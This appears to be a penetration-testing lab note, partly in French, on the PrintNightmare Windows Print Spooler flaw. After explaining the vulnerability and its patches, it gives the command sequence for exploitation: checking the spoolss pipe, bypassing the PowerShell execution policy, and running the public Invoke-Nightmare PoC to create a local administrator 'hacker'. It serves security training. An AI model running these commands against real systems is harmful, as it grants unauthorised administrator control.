# CVE-2021-1675/CVE-2021-34527 PrintNightmare

<mark style="color:green;">**CVE-2021-1675/CVE-2021-34527 PrintNightmare**</mark>&#x20;

{% hint style="warning" %}
Une faille dans **RpcAddPrinterDriver**, qui est utilisée pour permettre l'impression à distance et l'installation de pilotes.&#x20;

Cette fonction est censée donner aux utilisateurs ayant le privilège Windows **SeLoadDriverPrivilege** la capacité d'ajouter des pilotes à un **Print Spooler** distant. Ce droit est généralement réservé aux utilisateurs du groupe **Administrateurs intégrés** et aux **opérateurs d'impression** qui peuvent avoir un besoin légitime d'installer un pilote d'imprimante sur la machine d'un utilisateur final à distance. La faille permettait à **tout utilisateur authentifié** d'ajouter un pilote d'imprimante à un système Windows sans posséder le privilège mentionné ci-dessus, permettant à un attaquant d'exécuter à distance du **code arbitraire avec les privilèges SYSTEM** sur n'importe quel système affecté. La faille affecte **toutes les versions supportées de Windows**, et étant donné que le **Print Spooler** s'exécute par défaut sur les **Contrôleurs de Domaine**, **Windows 7 et 10**, et est souvent activé sur les **serveurs Windows**, cela présente une **surface d'attaque massive**, d'où le terme "nightmare" (cauchemar).\
Microsoft a initialement publié un patch qui ne corrigeait pas le problème (et les premières recommandations consistaient à désactiver le service **Spooler**, ce qui n'est pas pratique pour de nombreuses organisations), mais a publié un **deuxième patch en juillet 2021**, accompagné de recommandations pour vérifier que certains paramètres du registre soient soit définis sur **0**, soit non définis.\
Une fois que cette vulnérabilité a été rendue publique, des **exploits PoC** ont été rapidement publiés. Cette version par **@cube0x0** peut être utilisée pour exécuter une **DLL malveillante à distance ou localement** en utilisant une version modifiée de **Impacket**. Le **repo** contient également une implémentation en **C#**. Cette implémentation **PowerShell** peut être utilisée pour une **escalade rapide de privilèges locaux**. Par défaut, ce script ajoute un **nouvel utilisateur administrateur local**, mais il est également possible de fournir une **DLL personnalisée** pour obtenir un **reverse shell** ou d'autres actions similaires si l'ajout d'un utilisateur administrateur local n'est pas dans le périmètre.
{% endhint %}

<mark style="color:green;">**Checking for Spooler Service**</mark>

We can quickly check if the Spooler service is running with the following command. If it is not running, we will receive a "path does not exist" error.

```powershell-session
PS C:\htb> ls \\localhost\pipe\spoolss
```

<mark style="color:green;">**Adding Local Admin with PrintNightmare PowerShell PoC**</mark>

First start by [bypassing](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/) the execution policy on the target host:

```powershell-session
PS C:\htb> Set-ExecutionPolicy Bypass -Scope Process
```

{% code fullWidth="true" %}
```powershell-session
PS C:\htb> Import-Module .\CVE-2021-1675.ps1
PS C:\htb> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"
```
{% endcode %}

<mark style="color:green;">**Confirming New Admin User**</mark>

```powershell-session
PS C:\htb> net user hacker
```
